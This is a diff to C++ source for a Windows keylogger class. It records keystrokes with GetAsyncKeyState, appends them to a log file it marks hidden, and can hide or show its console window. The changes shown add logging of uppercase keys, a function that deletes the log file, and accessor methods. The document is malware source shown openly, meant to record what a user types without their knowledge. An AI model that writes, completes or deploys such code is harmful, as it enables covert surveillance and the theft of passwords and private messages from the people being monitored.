@@ -4,6 +4,7 @@
 #include <iostream>
 #include <typeinfo>
 #include<sstream>
+#include <stdio.h>
 
 Keylogger::Keylogger()
 {
@@ -13,6 +14,7 @@ Keylogger::Keylogger()
 Keylogger::Keylogger(string fileName)
 {
 	filename = fileName;
+
 }
 
 int Keylogger::writeIntoFile(string words) {
@@ -21,6 +23,12 @@ int Keylogger::writeIntoFile(string words) {
 	fichier << words;
 	fichier.close();
 	setHiddenFile();
+	return 0;
+}
+
+int Keylogger::clearFile()
+{
+	remove(getFile().c_str());
 	return 0;
 }
 
@@ -40,6 +48,7 @@ void Keylogger::listenKeyboard() {
 		capsOnBool = true;
 	}
 	if (capsOff == 1) {
+
 		writeIntoFile("[CAPS LOCK OFF]");
 		capsOnBool = false;
 	}
@@ -54,6 +63,7 @@ void Keylogger::listenKeyboard() {
 			/* MAJUSCULE */
 			if (GetAsyncKeyState(VK_SHIFT) && key >= 64 && key <= 91) {
 				string words(1,(char (key)));
+				writeIntoFile(words);
 			}
 			
 			/* MINUSCULE */ 
@@ -428,4 +438,24 @@ int Keylogger::showConsole()
 
 	ShowWindow(GetConsoleWindow(), SW_SHOW);
 	return 0;
+}
+
+string Keylogger::getFile()
+{
+	return filename;
+}
+
+void Keylogger::setFile(string fileName)
+{
+	filename = fileName;
+}
+
+void Keylogger::setCaps(bool b)
+{
+	capsStart = b;
+}
+
+bool Keylogger::getCaps()
+{
+	return capsStart;
 }
